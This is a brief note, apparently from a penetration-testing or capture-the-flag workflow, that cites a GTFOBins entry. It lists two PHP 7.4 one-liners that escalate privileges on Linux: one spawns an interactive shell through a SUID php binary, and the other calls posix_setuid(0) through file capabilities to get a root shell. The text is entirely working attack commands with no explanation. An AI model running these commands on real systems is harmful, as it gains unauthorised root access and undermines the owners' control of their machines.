/usr/bin/php7.4

https://gtfobins.org/gtfobins/php/

SUID
```
/usr/bin/php7.4 -r 'system("/bin/sh -i");'
```

Capabilities
```
/usr/bin/php7.4 -r 'posix_setuid(0); system("/bin/sh -i");'
```

